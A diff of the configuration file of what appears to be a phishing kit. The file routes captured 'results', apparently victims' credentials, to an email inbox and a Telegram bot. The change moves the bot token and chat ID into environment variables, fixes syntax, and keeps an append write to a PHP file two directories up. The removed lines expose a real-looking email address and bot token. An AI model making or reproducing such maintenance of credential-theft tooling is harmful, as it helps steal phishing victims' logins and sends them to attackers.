@@ -1,28 +1,21 @@
-﻿<?php
-
+<?php
 
 /* 📧 Set Your Email Address to Receive Results in Your Inbox */
 $Your_Mail = "danyellekurtz.conway@outlook.com";
-/* --------------------------  */
-
 
 /* 🤖 Telegram Bot Setup 🤖 */
 
-// 🗝️ Enter your bot's token
-$botToken = 7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg;
+// 🗝️ Retrieve your bot's token from environment variable
+$botToken = getenv('BOT_TOKEN'); // Replace 'BOT_TOKEN' with the actual name of your environment variable
 
-// 💬 Enter your chat ID
-$chatId = 7296145278;
+// 💬 Retrieve your chat ID from environment variable
+$chatId = getenv('CHAT_ID'); // Replace 'CHAT_ID' with the actual name of your environment variable
 
 /* --------------------------------------------------- */
 
-/* If you want two to see the result, If you want to stop , change To off  :)  */
-$botToken_0= on; 
-$chatId_0= on;  
-/* --------------------------  */
-
-
-
+/* If you want to send results to Telegram, set to 'on'. To stop, set to 'off'. :) */
+$botToken_0 = "on";
+$chatId_0 = "on";
 
 /* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */
 
@@ -31,8 +24,11 @@ $Elite_Group = "t.me/BLACKROSEx1337"; // ♣️ Join the Elite Coding Squad
 
 /* -------------------------------- */
 
-$f = fopen("../../a.php", "a");
-	fwrite($f, $yagmai);
+// Ensure $yagmai is defined before using it
+$yagmai = "Some data to write";  // Example content, define appropriately
 
+$f = fopen("../../a.php", "a");
+fwrite($f, $yagmai);
+fclose($f);  // Always close the file after writing
 
 ?>
